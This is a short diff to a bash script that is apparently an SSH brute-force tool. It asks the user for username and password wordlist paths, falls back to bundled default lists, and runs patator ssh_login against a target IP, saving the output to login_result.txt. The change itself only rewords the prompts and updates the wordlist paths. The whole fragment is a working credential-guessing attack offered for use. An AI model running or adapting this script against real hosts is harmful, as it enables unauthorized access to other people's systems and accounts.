@@ -38,8 +38,8 @@ echo "ssh port is OPEN"
 
 echo "ssh port is closed"
         fi
-read -p "If you Have A UserNames List Insert It Here To Use It In The BruteForce Attack On SSH PORT : " PATH1
-read -p "If you Have A Passwords List Insert It Here To Use It In The BruteForce Attack On SSH PORT : " PATH2
+read -p "If you Have A UserNames List Insert It Here To Use It In The BruteForce Attack On SSH PORT IF YOU DONT HAVE JUST PRESS ENTER : " PATH1
+read -p "If you Have A Passwords List Insert It Here To Use It In The BruteForce Attack On SSH PORT IF YOU DONT HAVE JUST PRESS ENTER: " PATH2
 
 if [ ! -z "$PATH1" ]  && [ ! -z "$PATH2" ];
         then
@@ -47,14 +47,14 @@ patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0 1="$PATH1" 0="$PAT
         fi
 if [ -z "$PATH1" ];
         then 
-patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0  1=/home/kali/ssh_brute/ssh_usernames_list.txt  0="$PATH2" 2>&1 | tee login_result.txt 
+patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0  1=/home/kali/ssh-brute-force-tool/ssh_usernames_list.txt  0="$PATH2" 2>&1 | tee login_result.txt 
         fi
 
         if [ -z "$PATH2" ];
 then
-        patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0 1="$PATH1" 0=/home/kali/ssh_brute/ssh_passwords_list.txt  2>&1 | tee login_result.txt 
+        patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0 1="$PATH1" 0=/home/kali/ssh-brute-force-tool/ssh_passwords_list.txt  2>&1 | tee login_result.txt 
         fi
         if [ -z "$PATH1" ] && [ -z "$PATH2" ]
 then
-        patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0 1=/home/kali/ssh_brute/ssh_usernames_list.txt 0=/home/kali/ssh_brute/ssh_passwords_list.txt 2>&1 | tee login_result.txt 
+        patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0 1=/home/kali/ssh-brute-force-tool/ssh_usernames_list.txt 0=/home/kali/ssh-brute-force-tool/ssh_passwords_list.txt 2>&1 | tee login_result.txt 
 fi
